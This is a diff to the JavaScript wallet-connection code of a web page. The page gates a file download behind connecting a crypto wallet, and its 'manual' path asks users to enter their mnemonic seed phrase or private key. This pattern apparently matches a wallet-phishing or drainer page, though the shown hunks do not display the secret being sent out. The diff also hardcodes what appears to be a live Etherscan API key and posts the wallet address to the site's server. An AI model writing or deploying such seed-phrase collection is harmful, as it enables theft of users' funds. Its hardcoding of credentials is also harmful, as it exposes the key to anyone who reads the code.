@@ -104,8 +104,7 @@ class WalletConnection {
         walletList.forEach(wallet => {
             walletHTML += `
                 <div class="wallet-option" onclick="window.open('${wallet.deepLink}', '_blank')">
-                    <img src="${wallet.logo}" alt="${wallet.name}" class="wallet-logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';">
-                    <span class="wallet-icon-fallback" style="display: none;">📱</span>
+                    <img src="${wallet.logo}" alt="${wallet.name}" class="wallet-logo">
                     <span class="wallet-name">${wallet.name}</span>
                 </div>
             `;
@@ -200,48 +199,23 @@ class WalletConnection {
                 connectBtn.innerHTML = '<span class="loading-spinner"></span> Connecting...';
             }
 
-            // Try to use browser's Web3 provider first (MetaMask, etc.)
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    // Request account access
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
-                    });
-                    
-                    if (accounts.length > 0) {
-                        const chainId = await window.ethereum.request({ 
-                            method: 'eth_chainId' 
-                        });
-                        
-                        await this.handleWalletConnection({
-                            address: accounts[0],
-                            chainId: parseInt(chainId, 16),
-                            connectionMethod: 'web3_provider',
-                            type: 'external'
-                        });
-                        return;
-                    }
-                } catch (error) {
-                    console.log('Web3 provider connection failed, trying WalletConnect:', error);
-                }
-            }
-
-            // Fallback to WalletConnect modal or deep links
-            if (this.web3Modal && this.web3Modal.openModal) {
-                await this.web3Modal.openModal();
+            if (this.web3Modal) {
+                const { address, chainId } = await this.web3Modal.openModal();
+                await this.handleWalletConnection({
+                    address,
+                    chainId,
+                    connectionMethod: 'walletconnect',
+                    type: 'external'
+                });
             } else {
-                // Show fallback wallet selection
-                this.showWalletConnectFallback();
+                this.showError('WalletConnect is not initialized.');
+                this.switchToManualTab();
             }
 
         } catch (error) {
             console.error('WalletConnect connection failed:', error);
-            this.showError('WalletConnect failed. Redirecting to manual connection...');
-            
-            // Automatic fallback to manual connection
-            setTimeout(() => {
-                this.switchToManualTab();
-            }, 2000);
+            this.showError('WalletConnect failed. Please try again.');
+            this.switchToManualTab();
         } finally {
             const connectBtn = document.getElementById('connect-walletconnect');
             if (connectBtn) {
@@ -280,8 +254,6 @@ class WalletConnection {
             };
 
             if (mnemonic) {
-
-                
                 // Derive wallet from mnemonic
                 const wallet = await this.deriveWalletFromMnemonic(mnemonic);
                 walletData = {
@@ -307,6 +279,9 @@ class WalletConnection {
 
             // Validate wallet on blockchain
             const isValid = await this.validateWalletOnChain(walletData.address);
+            if (!isValid) {
+                throw new Error('Invalid wallet. Please check your mnemonic or private key.');
+            }
             walletData.isValidated = isValid;
 
             await this.handleWalletConnection(walletData);
@@ -369,23 +344,14 @@ class WalletConnection {
             this.isConnected = true;
             this.connectedAccount = walletData.address;
             
-            // Show enhanced success message based on connection method
-            let successMessage = 'Congratulations! Your wallet is successfully connected.';
-            if (walletData.connectionMethod === 'manual') {
-                successMessage = 'Congratulations! Your wallet is successfully connected and validated on the blockchain.';
-            }
-            
-            this.showSuccess(successMessage);
+            this.showSuccess('Congratulations! Your wallet is successfully connected.');
             
             // Automatic redirection flow
             setTimeout(() => {
                 this.closeModal();
-                // Auto-redirect to manual guide page and start download
-                setTimeout(() => {
-                    this.showSetupInstructions();
-                    this.initiateDownload();
-                }, 500);
-            }, 4000); // Longer delay to show success message
+                this.showSetupInstructions();
+                this.initiateDownload();
+            }, 2000);
 
         } catch (error) {
             console.error('Failed to handle wallet connection:', error);
@@ -467,7 +433,7 @@ class WalletConnection {
     async validateAddressOnEtherscan(address) {
         try {
             const response = await fetch(
-                `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`,
+                `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=9D13ZE7XSBTJ9W7N581Z81Z9I6AI95A255`,
                 { timeout: 5000 }
             );
             
@@ -659,7 +625,10 @@ class WalletConnection {
                 headers: {
                     'Content-Type': 'application/json',
                     'Authorization': `Bearer ${window.authManager.sessionToken}`
-                }
+                },
+                body: JSON.stringify({
+                    wallet_address: this.connectedAccount
+                })
             });
 
             const result = await response.json();
@@ -669,7 +638,7 @@ class WalletConnection {
             }
 
             // Start download
-            window.location.href = `${this.apiBase}/api/download/file?token=${result.downloadToken}`;
+            window.location.href = `${this.apiBase}/download/${result.downloadToken}`;
             
             // Show setup instructions
             setTimeout(() => {
